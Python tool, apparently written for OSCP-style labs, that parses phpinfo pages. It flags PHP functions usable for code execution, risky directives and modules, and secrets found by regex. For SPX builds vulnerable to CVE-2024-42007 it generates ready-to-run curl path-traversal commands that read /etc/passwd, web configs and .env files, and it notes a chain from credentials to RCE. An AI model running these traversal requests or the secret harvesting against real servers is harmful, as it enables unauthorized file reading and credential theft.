#!/usr/bin/env python3
"""
-----------------------------------------------------------------------------
phpinfo_cense.py - Descarga y censa phpinfo para labs (OSCP-oriented).
Uso:
  python3 phpinfo_cense.py http://IP/phpinfo.php
  python3 phpinfo_cense.py ./phpinfo.html
  python3 phpinfo_cense.py http://IP/phpinfo.php -o report.txt
Solo ENUMERA. No explota. Curls SPX = sugerencias manuales.
-----------------------------------------------------------------------------
phpinfo_cense.py - OSCP-oriented phpinfo enumerator (enum only, no exploit).

Fetches a phpinfo page (URL or local HTML) and summarizes what matters for
web/PHP attacks:
  - Core paths (DOCUMENT_ROOT, SCRIPT_FILENAME, PHP/server version)
  - Security directives (disable_functions, open_basedir, allow_url_*, uploads,
    auto_prepend/append, etc.) and quick notes on RCE/LFI impact
  - Interesting extensions (SPX, phar, imagick, mysqli, ...)
  - SPX details: version vs CVE-2024-42007 (<= 0.4.15 path traversal READ),
    http_key, and suggested manual curl commands (you run them)
  - LFI path hints from DOCUMENT_ROOT
  - Light filtered heuristic for password/token-like strings

Does NOT exploit anything. Output is for recon only.

Usage:
  python3 phpinfo_cense.py http://TARGET/phpinfo.php
  python3 phpinfo_cense.py ./phpinfo.html
  python3 phpinfo_cense.py http://TARGET/phpinfo.php -o report.txt
------------------------------------------------------------------------------

"""
from __future__ import annotations

import argparse
import re
import sys
from html import unescape
from urllib.error import HTTPError, URLError
from urllib.request import Request, urlopen

try:
    from bs4 import BeautifulSoup

    HAS_BS4 = True
except ImportError:
    HAS_BS4 = False

# funciones típicas de RCE en PHP (para contrastar con disable_functions)
DANGEROUS_FUNCS = [
    "system",
    "exec",
    "shell_exec",
    "passthru",
    "proc_open",
    "popen",
    "pcntl_exec",
    "assert",
    "putenv",
    "mail",
    "putenv",
    "dl",
]

SECRET_NOISE = re.compile(
    r"(?i)author|copyright|license|documentation|example|php\.net|zend|released"
)


def fetch(source: str) -> str:
    if source.startswith("http://") or source.startswith("https://"):
        req = Request(source, headers={"User-Agent": "phpinfo-cense/1.1"})
        with urlopen(req, timeout=20) as r:
            return r.read().decode("utf-8", errors="replace")
    with open(source, "r", encoding="utf-8", errors="replace") as f:
        return f.read()


def strip_html(html: str) -> str:
    text = re.sub(r"(?is)<script.*?>.*?</script>", " ", html)
    text = re.sub(r"(?is)<style.*?>.*?</style>", " ", text)
    text = re.sub(r"(?s)<[^>]+>", "\n", text)
    text = unescape(text)
    text = re.sub(r"[ \t]+", " ", text)
    text = re.sub(r"\n\s*\n+", "\n", text)
    return text


def parse_directives_bs4(html: str) -> dict:
    soup = BeautifulSoup(html, "html.parser")
    out = {}
    for tr in soup.find_all("tr"):
        tds = tr.find_all("td")
        if len(tds) >= 2:
            k = tds[0].get_text(" ", strip=True)
            local = tds[1].get_text(" ", strip=True)
            master = tds[2].get_text(" ", strip=True) if len(tds) > 2 else local
            if k and k not in out:
                out[k] = (local, master)
    return out


def find_regex(text: str, pattern: str, flags=re.I):
    m = re.search(pattern, text, flags)
    return m.group(1).strip() if m else None


def is_empty_val(val: str | None) -> bool:
    if val is None:
        return True
    low = val.lower().strip()
    return low in ("", "no value", "no value no value", "none", "(none)")


def parse_version(ver: str) -> list[int] | None:
    try:
        return [int(x) for x in ver.split(".")]
    except ValueError:
        return None


def spx_vulnerable(ver: str | None) -> bool | None:
    """True si <= 0.4.15, False si claramente mayor, None si desconocido."""
    if not ver:
        return None
    parts = parse_version(ver)
    if not parts:
        return None
    # normaliza a 3 componentes
    while len(parts) < 3:
        parts.append(0)
    return parts[:3] <= [0, 4, 15]


def analyze_disable_functions(val: str | None) -> list[str]:
    notes = []
    if is_empty_val(val):
        notes.append("empty / not restrictive << RCE helpers likely available")
        return notes
    low = val.lower()
    blocked = {x.strip() for x in low.replace(",", " ").split() if x.strip()}
    free = [f for f in DANGEROUS_FUNCS if f not in blocked]
    if free:
        notes.append(f"NOT blocked: {', '.join(free)} << useful if you get code exec")
    critical = [f for f in ("system", "exec", "shell_exec", "passthru", "proc_open") if f in blocked]
    if critical:
        notes.append(f"blocked: {', '.join(critical)}")
    return notes


def cense(html: str, source_url: str) -> str:
    text = strip_html(html)
    directives = parse_directives_bs4(html) if HAS_BS4 else {}

    def dir_get(name: str) -> str | None:
        if name in directives:
            return directives[name][0]
        m = re.search(
            rf"{re.escape(name)}\s+([^\n]+?)(?:\s{{2,}}|\n)",
            text,
            re.I,
        )
        if m:
            return m.group(1).strip()
        m = re.search(rf"^{re.escape(name)}\s+(\S.*?)$", text, re.I | re.M)
        return m.group(1).strip() if m else None

    lines: list[str] = []
    lines.append("=" * 72)
    lines.append("PHPINFO CENSE v1.1")
    lines.append(f"Source: {source_url}")
    if not HAS_BS4:
        lines.append("[i] bs4 not installed -> weaker table parse (pip install beautifulsoup4)")
    lines.append("=" * 72)

    # --- Core ---
    php_ver = find_regex(text, r"PHP Version\s+([0-9.]+)")
    lines.append("\n[+] CORE")
    lines.append(f"  PHP Version      : {php_ver or '?'}")
    docroot = dir_get("DOCUMENT_ROOT") or find_regex(
        text, r"\$_SERVER\['DOCUMENT_ROOT'\]\s+(\S+)"
    )
    script = dir_get("SCRIPT_FILENAME") or find_regex(
        text, r"\$_SERVER\['SCRIPT_FILENAME'\]\s+(\S+)"
    )
    lines.append(f"  DOCUMENT_ROOT    : {docroot or '?'}")
    lines.append(f"  SCRIPT_FILENAME  : {script or '?'}")
    server = find_regex(text, r"(Apache/[0-9.]+(?:\s*\([^)]+\))?)") or find_regex(
        text, r"SERVER_SOFTWARE\s+(\S.+)"
    )
    if server:
        lines.append(f"  Server           : {server}")

    # --- Security directives ---
    lines.append("\n[+] SECURITY DIRECTIVES")
    sec_keys = [
        "disable_functions",
        "disable_classes",
        "open_basedir",
        "allow_url_include",
        "allow_url_fopen",
        "file_uploads",
        "upload_tmp_dir",
        "upload_max_filesize",
        "post_max_size",
        "session.save_path",
        "session.save_handler",
        "auto_prepend_file",
        "auto_append_file",
        "expose_php",
        "display_errors",
        "log_errors",
        "error_log",
    ]
    for key in sec_keys:
        val = dir_get(key)
        flag = ""
        if val is not None:
            low = val.lower()
            if key == "allow_url_include" and "on" in low:
                flag = "  << RFI possible if LFI exists"
            if key == "allow_url_fopen" and "on" in low:
                flag = "  << remote file fetch OK"
            if key == "file_uploads" and "on" in low:
                flag = "  << uploads enabled"
            if key == "open_basedir" and not is_empty_val(val):
                flag = "  << LFI limited to this tree"
            if key in ("auto_prepend_file", "auto_append_file") and not is_empty_val(val):
                flag = "  << check path (LFI/chain interest)"
        lines.append(f"  {key:22}: {val or '(not found)'}{flag}")
        if key == "disable_functions":
            for note in analyze_disable_functions(val):
                lines.append(f"    -> {note}")

    # --- Modules ---
    lines.append("\n[+] MODULES / EXTENSIONS (interesting)")
    mods = {
        "SPX": bool(re.search(r"\bSPX Support\s+enabled", text, re.I)),
        "Xdebug": bool(re.search(r"\bxdebug support\s+enabled", text, re.I)),
        "imagick": bool(re.search(r"\bimagick module\s+enabled|\bImagick", text, re.I)),
        "curl": bool(re.search(r"\bcURL support\s+enabled", text, re.I)),
        "openssl": bool(re.search(r"\bOpenSSL support\s+enabled", text, re.I)),
        "pdo_mysql": bool(re.search(r"\bPDO Driver for MySQL|pdo_mysql", text, re.I)),
        "mysqli": bool(re.search(r"\bMysqli Support\s+enabled|\bmysqli\b", text, re.I)),
        "pgsql": bool(re.search(r"\bPostgreSQL.*enabled|\bpgsql\b", text, re.I)),
        "sqlite3": bool(re.search(r"\bSQLite.*enabled|\bsqlite3\b", text, re.I)),
        "ssh2": bool(re.search(r"\bssh2 support\s+enabled|\bssh2\b", text, re.I)),
        "zip": bool(re.search(r"\bZip\s+enabled|\bzip support", text, re.I)),
        "phar": bool(re.search(r"\bPhar:\s*Phar extension|\bPhar support", text, re.I)),
        "imap": bool(re.search(r"\bIMAP support\s+enabled|\bIMAP c-Client", text, re.I)),
        "ldap": bool(re.search(r"\bLDAP Support\s+enabled", text, re.I)),
        "ffi": bool(re.search(r"\bFFI support\s+enabled|\bffi\b", text, re.I)),
        "pcntl": bool(re.search(r"\bpcntl support\s+enabled", text, re.I)),
        "redis": bool(re.search(r"\bRedis Support\s+enabled|\bredis\b", text, re.I)),
        "memcached": bool(re.search(r"\bmemcached support\s+enabled", text, re.I)),
        "gd": bool(re.search(r"\bGD Support\s+enabled", text, re.I)),
    }
    any_mod = False
    for name, present in mods.items():
        if present:
            any_mod = True
            extra = ""
            if name == "Xdebug":
                extra = "  << info leak / sometimes RCE chains"
            if name == "imagick":
                extra = "  << ImageTragick-class issues (version dependent)"
            if name == "phar":
                extra = "  << phar:// wrapper if user-controlled path"
            if name == "ffi":
                extra = "  << powerful if exposed to user code"
            lines.append(f"  [PRESENT] {name}{extra}")
    if not any_mod:
        lines.append("  (none of the watched modules matched)")

    # --- SPX ---
    spx_ver = find_regex(text, r"SPX Version\s+([0-9.]+)")
    spx_key = dir_get("spx.http_key") or find_regex(
        text, r"spx\.http_key\s+([a-fA-F0-9]{16,})"
    )
    spx_enabled = dir_get("spx.http_enabled") or find_regex(
        text, r"spx\.http_enabled\s+(\S+)"
    )
    spx_ui = dir_get("spx.http_ui_assets_dir") or dir_get("spx.http_ui_assets")
    spx_data = dir_get("spx.data_dir")
    if spx_ver or spx_key or mods.get("SPX"):
        lines.append("\n[!] SPX DETECTED")
        lines.append(f"  SPX Version       : {spx_ver or '?'}")
        lines.append(f"  spx.http_enabled  : {spx_enabled or '?'}")
        lines.append(f"  spx.http_key      : {spx_key or '?'}")
        lines.append(f"  spx.data_dir      : {spx_data or '?'}")
        lines.append(f"  spx.http_ui_assets: {spx_ui or '?'}")
        vuln = spx_vulnerable(spx_ver)
        if vuln is True:
            lines.append("  STATUS : VULNERABLE (<= 0.4.15) CVE-2024-42007")
            lines.append("  IMPACT : path traversal FILE READ (not RCE)")
        elif vuln is False:
            lines.append("  STATUS : version looks > 0.4.15 (check CVE manually)")
        else:
            lines.append("  STATUS : check version manually vs CVE-2024-42007")
        if spx_key and source_url.startswith("http"):
            base = source_url.split("?")[0]
            lines.append("\n  --- suggested manual curls (YOU run them) ---")
            paths = [
                "/etc/passwd",
                "/etc/apache2/sites-enabled/000-default.conf",
                "/etc/nginx/sites-enabled/default",
            ]
            if docroot and docroot.startswith("/"):
                paths.extend(
                    [
                        f"{docroot}/index.php",
                        f"{docroot}/config.php",
                        f"{docroot}/.env",
                    ]
                )
            else:
                paths.extend(
                    [
                        "/var/www/html/index.php",
                        "/var/www/html/phpinfo.php",
                        "/var/www/html/config.php",
                    ]
                )
            if script and script.startswith("/"):
                paths.append(script)
            # unique preserve order
            seen_p: set[str] = set()
            for path in paths:
                if path in seen_p:
                    continue
                seen_p.add(path)
                trav = "/.." * 12 + path
                lines.append(f"  curl -s '{base}?SPX_KEY={spx_key}&SPX_UI_URI={trav}'")

    # --- LFI helper paths from docroot ---
    if docroot and docroot.startswith("/"):
        lines.append("\n[+] LFI / READ PATH HINTS (from DOCUMENT_ROOT)")
        for p in (
            f"{docroot}/index.php",
            f"{docroot}/config.php",
            f"{docroot}/.env",
            f"{docroot}/../.env",
            "/etc/passwd",
            "/proc/self/environ",
        ):
            lines.append(f"  {p}")

    # --- Env / secrets (filtered) ---
    lines.append("\n[+] ENV / SECRETS (heuristic, filtered)")
    secret_hits = re.findall(
        r"(?i)((?:password|passwd|secret|token|api[_-]?key|http_key|db_pass|"
        r"aws_|database_url|mysql_|postgres_)[^\n]{0,100})",
        text,
    )
    seen: set[str] = set()
    count = 0
    for h in secret_hits:
        h = h.strip()
        if h in seen or SECRET_NOISE.search(h):
            continue
        # skip pure directive names without value-ish content
        if len(h) < 8:
            continue
        seen.add(h)
        lines.append(f"  {h}")
        count += 1
        if count >= 25:
            break
    if count == 0:
        lines.append("  (no strong hits)")

    # --- Request context ---
    host = find_regex(text, r"\$_SERVER\['HTTP_HOST'\]\s+(\S+)")
    remote = find_regex(text, r"\$_SERVER\['REMOTE_ADDR'\]\s+(\S+)")
    cwd = find_regex(text, r"\$_SERVER\['PWD'\]\s+(\S+)") or dir_get("PWD")
    if host or remote or cwd:
        lines.append("\n[+] REQUEST CONTEXT")
        if host:
            lines.append(f"  HTTP_HOST       : {host}")
        if remote:
            lines.append(f"  REMOTE_ADDR(you): {remote}")
        if cwd:
            lines.append(f"  PWD             : {cwd}")

    lines.append("\n[+] NOTES")
    lines.append("  - Enum only. Does not exploit.")
    lines.append("  - SPX curls are suggestions; run manually if in scope.")
    lines.append("  - Next: LFI/SPX read configs -> creds -> upload/RCE.")
    lines.append("=" * 72)
    return "\n".join(lines)


def main() -> None:
    ap = argparse.ArgumentParser(description="Cense phpinfo (enum only)")
    ap.add_argument("source", help="URL (http...) or local file path")
    ap.add_argument("-o", "--output", help="write report to file")
    args = ap.parse_args()
    try:
        html = fetch(args.source)
    except (URLError, HTTPError, OSError) as e:
        print(f"[-] fetch failed: {e}", file=sys.stderr)
        sys.exit(1)
    report = cense(html, args.source)
    print(report)
    if args.output:
        with open(args.output, "w", encoding="utf-8") as f:
            f.write(report + "\n")
        print(f"\n[+] wrote {args.output}", file=sys.stderr)


if __name__ == "__main__":
    main()
